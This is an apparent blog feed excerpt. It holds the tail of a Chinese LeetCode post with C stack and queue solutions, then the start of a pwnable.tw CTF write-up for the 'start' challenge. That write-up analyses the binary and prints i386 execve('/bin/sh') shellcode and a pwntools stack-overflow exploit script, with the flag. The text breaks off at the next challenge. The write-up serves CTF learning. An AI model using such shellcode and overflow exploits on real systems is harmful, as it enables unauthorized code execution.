class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> * in_stack;</span><br><span class="line">    <span class="keyword">int</span> * out_stack;</span><br><span class="line">    <span class="keyword">int</span> top_in;</span><br><span class="line">    <span class="keyword">int</span> top_out;</span><br><span class="line">&#125; CQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">CQueue* <span class="title">cQueueCreate</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CQueue *<span class="built_in">queue</span> = (CQueue*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CQueue));</span><br><span class="line">    <span class="built_in">queue</span>-&gt;top_in = <span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">queue</span>-&gt;top_out = <span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">queue</span>-&gt;in_stack = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="number">10005</span>);</span><br><span class="line">    <span class="built_in">queue</span>-&gt;out_stack = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="number">10005</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">queue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cQueueAppendTail</span><span class="params">(CQueue* obj, <span class="keyword">int</span> value)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj-&gt;top_in++;</span><br><span class="line">    obj-&gt;in_stack[obj-&gt;top_in] = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cQueueDeleteHead</span><span class="params">(CQueue* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(obj-&gt;top_in == <span class="number">-1</span>&amp;&amp;obj-&gt;top_out == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(obj-&gt;top_out == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(obj-&gt;top_in!=<span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            obj-&gt;top_out++;</span><br><span class="line">            obj-&gt;out_stack[obj-&gt;top_out] = obj-&gt;in_stack[obj-&gt;top_in];</span><br><span class="line">            obj-&gt;top_in--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    obj-&gt;top_out--;</span><br><span class="line">    <span class="keyword">return</span> obj-&gt;out_stack[obj-&gt;top_out+<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cQueueFree</span><span class="params">(CQueue* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">free</span>(obj-&gt;in_stack);</span><br><span class="line">    <span class="built_in">free</span>(obj-&gt;out_stack);</span><br><span class="line">    <span class="built_in">free</span>(obj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your CQueue struct will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * CQueue* obj = cQueueCreate();</span></span><br><span class="line"><span class="comment"> * cQueueAppendTail(obj, value);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * int param_2 = cQueueDeleteHead(obj);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * cQueueFree(obj);</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/06/9ij4FrL3vkIGect.png" alt="image.png"></p><p>那么到这里为止，<strong>【简单】</strong>难度的offer题就刷完了</p><h2 id="0x06-比较含退格的字符串"><a href="#0x06-比较含退格的字符串" class="headerlink" title="0x06.比较含退格的字符串"></a>0x06.<a href="https://leetcode-cn.com/problems/backspace-string-compare/" target="_blank" rel="noopener">比较含退格的字符串</a></h2><blockquote><p>给定 S 和 T 两个字符串，当它们分别被输入到空白的文本编辑器后，判断二者是否相等，并返回结果。 # 代表退格字符。</p><p>注意：如果对空文本输入退格字符，文本继续为空。</p><p>示例 1：</p><p>输入：S = “ab#c”, T = “ad#c”<br>输出：true<br>解释：S 和 T 都会变成 “ac”。<br>示例 2：</p><p>输入：S = “ab##”, T = “c#d#”<br>输出：true<br>解释：S 和 T 都会变成 “”。<br>示例 3：</p><p>输入：S = “a##c”, T = “#a#c”<br>输出：true<br>解释：S 和 T 都会变成 “c”。<br>示例 4：</p><p>输入：S = “a#c”, T = “b”<br>输出：false<br>解释：S 会变成 “c”，但 T 仍然是 “b”。</p><p>提示：</p><p>1 &lt;= S.length &lt;= 200<br>1 &lt;= T.length &lt;= 200<br>S 和 T 只含有小写字母以及字符 ‘#’。</p><p>进阶：</p><p>你可以用 O(N) 的时间复杂度和 O(1) 的空间复杂度解决该问题吗？</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/backspace-string-compare" target="_blank" rel="noopener">https://leetcode-cn.com/problems/backspace-string-compare</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>上电路分析课的时候闲着无聊（因为听不懂课（x））用iPad打的XD</p><p>遇到普通字符入栈，遇到<code>&#39;#&#39;</code>出栈一个字符即可</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">backspaceCompare</span><span class="params">(<span class="keyword">char</span> * S, <span class="keyword">char</span> * T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> * s1 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">205</span>),*s2 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">205</span>);</span><br><span class="line">    <span class="keyword">int</span> len1 = <span class="number">0</span>, len2= <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;S[i];i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(S[i] == <span class="string">'#'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(len1!=<span class="number">0</span>)</span><br><span class="line">                len1--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            s1[len1++] = S[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;T[i];i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(T[i] == <span class="string">'#'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(len2!=<span class="number">0</span>)</span><br><span class="line">                len2--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            s2[len2++] = T[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(len1!=len2)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len1;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(s1[i]!=s2[i])</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/26/RHMlXAVWP3bFQ4q.png" alt="image.png"></p><h1 id="0x02-难度：中等"><a href="#0x02-难度：中等" class="headerlink" title="0x02.难度：中等"></a>0x02.难度：中等</h1><h2 id="0x00-队列的最大值"><a href="#0x00-队列的最大值" class="headerlink" title="0x00.队列的最大值"></a>0x00.<a href="https://leetcode-cn.com/problems/dui-lie-de-zui-da-zhi-lcof/" target="_blank" rel="noopener">队列的最大值</a></h2><blockquote><p>请定义一个队列并实现函数 max_value 得到队列里的最大值，要求函数max_value、push_back 和 pop_front 的均摊时间复杂度都是O(1)。</p><p>若队列为空，pop_front 和 max_value 需要返回 -1</p><p>示例 1：</p><p>输入:<br>[“MaxQueue”,”push_back”,”push_back”,”max_value”,”pop_front”,”max_value”]<br>[[],[1],[2],[],[],[]]<br>输出: [null,null,null,2,1,2]<br>示例 2：</p><p>输入:<br>[“MaxQueue”,”pop_front”,”max_value”]<br>[[],[],[]]<br>输出: [null,-1,-1]</p><p>限制：</p><p>1 &lt;= push_back,pop_front,max_value的总操作数 &lt;= 10000<br>1 &lt;= value &lt;= 10^5</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/dui-lie-de-zui-da-zhi-lcof" target="_blank" rel="noopener">https://leetcode-cn.com/problems/dui-lie-de-zui-da-zhi-lcof</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>同样是一道来自于剑指offer的题目，照抄之前的两个栈构建队列即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">stack</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stack</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;Stack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Stack * in_stack;</span><br><span class="line">    Stack * out_stack;</span><br><span class="line">&#125; MaxQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">MaxQueue* <span class="title">maxQueueCreate</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MaxQueue * myQueue = (MaxQueue*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(MaxQueue));</span><br><span class="line">    myQueue-&gt;in_stack = <span class="literal">NULL</span>;</span><br><span class="line">    myQueue-&gt;out_stack = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> myQueue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxQueueMax_value</span><span class="params">(MaxQueue* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(obj-&gt;in_stack==<span class="literal">NULL</span>&amp;&amp;obj-&gt;out_stack==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">bool</span> pd1=<span class="literal">false</span>,pd2=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">int</span> max1,max2;</span><br><span class="line">    Stack* temp1=obj-&gt;in_stack,*temp2=obj-&gt;out_stack;</span><br><span class="line">    <span class="keyword">if</span>(temp1!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        max1=temp1-&gt;value;</span><br><span class="line">        pd1 = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(temp2!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        max2=temp2-&gt;value;</span><br><span class="line">        pd2 = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(temp1!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        max1 = max1&gt;temp1-&gt;value?max1:temp1-&gt;value;</span><br><span class="line">        temp1 = temp1-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(temp2!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        max2 = max2&gt;temp2-&gt;value?max2:temp2-&gt;value;</span><br><span class="line">        temp2 = temp2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pd1&amp;&amp;pd2)</span><br><span class="line">        <span class="keyword">return</span> max1&gt;max2?max1:max2;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pd1)</span><br><span class="line">        <span class="keyword">return</span> max1;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> max2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">maxQueuePush_back</span><span class="params">(MaxQueue* obj, <span class="keyword">int</span> value)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Stack *s = (Stack*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Stack));</span><br><span class="line">    s-&gt;value = value;</span><br><span class="line">    s-&gt;next = obj-&gt;in_stack;</span><br><span class="line">    obj-&gt;in_stack = s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxQueuePop_front</span><span class="params">(MaxQueue* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Stack * temp;</span><br><span class="line">    <span class="keyword">if</span>(obj-&gt;out_stack == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(obj-&gt;in_stack==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(obj-&gt;in_stack!=<span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            temp = obj-&gt;out_stack;</span><br><span class="line">            obj-&gt;out_stack = obj-&gt;in_stack;</span><br><span class="line">            obj-&gt;in_stack = obj-&gt;in_stack-&gt;next;</span><br><span class="line">            obj-&gt;out_stack-&gt;next = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> n = obj-&gt;out_stack-&gt;value;</span><br><span class="line">    temp = obj-&gt;out_stack;</span><br><span class="line">    obj-&gt;out_stack = obj-&gt;out_stack-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(temp);</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">maxQueueFree</span><span class="params">(MaxQueue* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Stack*temp;</span><br><span class="line">    <span class="keyword">while</span>(obj-&gt;in_stack!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = obj-&gt;in_stack;</span><br><span class="line">        obj-&gt;in_stack = obj-&gt;in_stack-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(temp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(obj-&gt;out_stack!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = obj-&gt;out_stack;</span><br><span class="line">        obj-&gt;out_stack = obj-&gt;out_stack-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(temp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MaxQueue struct will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MaxQueue* obj = maxQueueCreate();</span></span><br><span class="line"><span class="comment"> * int param_1 = maxQueueMax_value(obj);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * maxQueuePush_back(obj, value);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * int param_3 = maxQueuePop_front(obj);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * maxQueueFree(obj);</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/06/EOXigmlYwCteAoB.png" alt="image.png"></p><blockquote><p>咕了，后面有时间再继续做🕊🕊🕊</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-绪论&quot;&gt;&lt;a href=&quot;#0x00-绪论&quot; class=&quot;headerlink&quot; title=&quot;0x00.绪论&quot;&gt;&lt;/a&gt;0x00.绪论&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;栈&lt;/strong&gt;（&lt;strong&gt;stack&lt;/strong&gt;）是在任何的数据结构课本当中都会花一定篇幅来讲述的数据结构之一，作为一种抽象数据结构，无论是在算法应用（逆波兰表达式等）、计组原理（函数调用栈等）还是在安全领域（栈溢出等）都能见到这一抽象数据结构的身影。&lt;/p&gt;
&lt;p&gt;上一篇关于Leetcode的博文里我们刷了简单线性表——单向链表的有关题目，那么这一次来刷一刷&lt;strong&gt;受限线性表&lt;/strong&gt;——栈的有关题目叭2333333.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注：这个绪论是在半夜写的，可能我其实还没开始做题，如果你看到文章字数不到一千字的话可以先🦄住等后续的更新XD&lt;/p&gt;
&lt;p&gt;注2：当晚回来打自己脸，写完绪论之后马上肝了几道题23333&lt;/p&gt;
&lt;p&gt;注3：出于一些奇怪的原因，我会优先选择面试题&lt;/p&gt;
&lt;p&gt;注4：点击标题可以直接进入原题网址&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;最后更新日期：2020.9.6&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="Online Judge" scheme="http://archive.next.arttnba3.cn/categories/Online-Judge/"/>
    
    
    <category term="算法" scheme="http://archive.next.arttnba3.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="C/C++" scheme="http://archive.next.arttnba3.cn/tags/C-C/"/>
    
    <category term="题解" scheme="http://archive.next.arttnba3.cn/tags/%E9%A2%98%E8%A7%A3/"/>
    
    <category term="Leetcode" scheme="http://archive.next.arttnba3.cn/tags/Leetcode/"/>
    
    <category term="链表" scheme="http://archive.next.arttnba3.cn/tags/%E9%93%BE%E8%A1%A8/"/>
    
    <category term="栈" scheme="http://archive.next.arttnba3.cn/tags/%E6%A0%88/"/>
    
  </entry>
  
  <entry>
    <title>【CTF题解-0x02】pwnable.tw write up by arttnb3</title>
    <link href="http://archive.next.arttnba3.cn/2020/08/17/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x02%E3%80%91pwnable-tw-write-up-by-arttnb3/"/>
    <id>http://archive.next.arttnba3.cn/2020/08/17/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x02%E3%80%91pwnable-tw-write-up-by-arttnb3/</id>
    <published>2020-08-17T13:19:29.000Z</published>
    <updated>2020-11-25T19:56:12.571Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-绪论"><a href="#0x00-绪论" class="headerlink" title="0x00.绪论"></a>0x00.绪论</h1><p><a href="https://pwnable.tw" target="_blank" rel="noopener">pwnable.tw</a>是一个世界范围内很有名的pwn题网站，作为主攻pwn的CTFer，上面的题对我而言自然是很有必要做的（当然我现在还太弱了XD</p><p>点开查看题解👇（<del>当然也有可能我暂时还一题都没有做出来2333</del></p><blockquote><p>注：原题皆可在本页面直接下载</p></blockquote><a id="more"></a><h1 id="0x01-start"><a href="#0x01-start" class="headerlink" title="0x01.start"></a>0x01.start</h1><blockquote><p> nc chall.pwnable.tw 10000</p></blockquote><p><a href="/download/pwnabletw/start" title="点击此处下载原题">点击下载-start</a> </p><p>惯例的<code>checksec</code>，发现保护全关，暗示可以为所欲为23333</p><p><img src="https://i.loli.net/2020/08/17/fFU9jXJR4NlxuGB.png" alt="image.png"></p><p>拖入IDA进行分析，<del>直接傻眼，这都什么东西</del>，整个程序只有一个<code>_start</code>函数和一个<code>_exit</code>函数</p><p><img src="https://i.loli.net/2020/08/17/IGXgV5kZ1u3AL4E.png" alt="image.png"></p><p>简单分析一下，该程序首先将<code>esp的值</code>、<code>_exit函数的地址</code>以及一串字符串<code>let&#39;s start the CTF</code>压入栈中</p><p>随后将esp的值传入ecx寄存器中，将0x14传入dl寄存器中，1传入bl寄存器中，4传入al寄存器中</p><p><strong>之后<code>int 0x80</code>中断指令触发Linux系统调用，al寄存器的值作为参数，调用了0x80中断的系统函数<code>sys_write()</code>，将bl、dl、ecx的值作为参数传入，输出字符串</strong></p><p><strong>随后将0x3c传入dl寄存器中，3传入al寄存器中，之后<code>int 0x80</code>中断指令触发Linux系统调用，al寄存器的值作为参数，调用了0x80中断的系统函数<code>sys_read()</code>，将bl、dl、ecx的值作为参数传入，读入最大0x3c个字节</strong></p><p>最后返回到<code>_exit</code>函数，退出程序</p><blockquote><p>参见：<a href="http://asm.sourceforge.net/syscall.html" target="_blank" rel="noopener">linux系统调用</a></p></blockquote><p><img src="https://i.loli.net/2020/08/17/ylLunQ8gIZpUVY9.png" alt="image.png"></p><p>那么在这个过程当中，<strong><code>esp与栈</code>的变化如下</strong>（字丑勿怪2333（图上应该是5次push，手快写错了XDDD</p><p><img src="https://i.loli.net/2020/08/17/lKcY7N8LV2fIB64.png" alt="image.png"></p><p>通过使用中断的方式调用系统函数，我们不难猜的出这应该是一个纯汇编写的程序</p><p>程序本身也没有其他多余的gadgets，在保护全关的情况下，我们可以考虑<strong>泄露esp的值，将shellcode输入到栈上，再控制程序跳转到栈上的shellcode以getshell</strong></p><p>那么我们可以考虑先覆盖掉return address，控制其跳转至<code>0x8048087</code>，重新调用<code>sys_write()</code>输出栈上的内容，此时程序会将<code>原esp的值</code>输出出来</p><p><img src="https://i.loli.net/2020/08/17/H6XJh48wE2bnMeT.png" alt="image.png"></p><p>随后程序接着往下走，重新调用<code>sys_read()</code>，我们便可以在这里输入我们的第二段payload：<strong>20*’A’ + 通过泄露的esp的值计算出来的存放shellcode的栈地址 + shellcode</strong>，这段payload用以getshell</p><p><img src="https://i.loli.net/2020/08/17/H52G6MoufiUagpy.png" alt="image.png"></p><p>简单分析我们可以知道经过第一次输入后的跳转再经过第二次输入后，栈上<code>原esp+0x14-4</code>的位置即是程序控制的返回地址，我们只需要在此处写上<code>原esp+0x14</code>，紧接着后面跟着覆盖上我们的shellcode即可getshell，整个过程如下图</p><p><img src="https://i.loli.net/2020/08/17/PYJNSMt7j8VF3ob.png" alt="image.png"></p><p>因为输入只有60个字节，故考虑使用11号中断调用execve(“/bin/sh”)来getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">;!c</span><br><span class="line">;execve (&quot;&#x2F;bin&#x2F;sh&quot;) </span><br><span class="line">xor ecx, ecx</span><br><span class="line">mul ecx</span><br><span class="line">push ecx</span><br><span class="line">push 0x68732f2f   ;; hs&#x2F;&#x2F;</span><br><span class="line">push 0x6e69622f   ;; nib&#x2F;</span><br><span class="line">mov ebx, esp</span><br><span class="line">mov al, 11</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><p>构造shellcode如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'</span></span><br></pre></td></tr></table></figure><p>我们最后得到的exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">write_addr = <span class="number">0x8048087</span></span><br><span class="line">shellcode = <span class="string">'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./start'</span>)<span class="comment">#p = remote('chall.pwnable.tw',10000)</span></span><br><span class="line">payload1 = <span class="string">'A'</span>*<span class="number">0x14</span> + p32(write_addr)</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">esp_value = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">payload2 = <span class="string">'A'</span>*<span class="number">0x14</span> + (esp_value+<span class="number">0x14</span>) + shellcode<span class="comment">#本地不明原因一直跑不通x</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>连接，发送我们的payload，成功得到flag（👈因为网不好连着试了好几次才成功…</p><p><img src="https://i.loli.net/2020/08/18/rY8vSGaO2R7Zu1W.png" alt="image.png"></p><p>得到flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;Pwn4bl3_tW_1s_y0ur_st4rt&#125;</span><br></pre></td></tr></table></figure><h1 id="0x02-orw"><a href="#0x02-orw" class="headerlink" title="0x02.orw"></a>0x02.orw</h1><blockquote><p>nc chall.pwnable.tw 10001</p></blockquote><p><a href="/download/pwnabletw/orw/orw" title="点击此处下载原题">点击下载-orw</a> 